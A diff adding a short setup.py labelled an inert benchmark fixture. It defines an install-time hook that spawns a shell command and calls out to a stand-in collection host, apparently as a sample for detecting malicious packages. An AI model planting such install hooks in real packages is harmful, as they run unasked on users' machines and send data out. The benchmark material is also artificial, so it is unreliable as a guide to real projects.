@@ -1,0 +1,11 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+import subprocess, urllib.request
+from setuptools import setup, Command
+class PostInstall(Command):
+    user_options = []
+    def initialize_options(self): pass
+    def finalize_options(self): pass
+    def run(self):
+        subprocess.Popen(["/bin/sh", "-c", "id"])
+        urllib.request.urlopen("http://198.51.100.42/collect")
+setup(name="demo-pkg", version="0.0.1", cmdclass={"install": PostInstall})
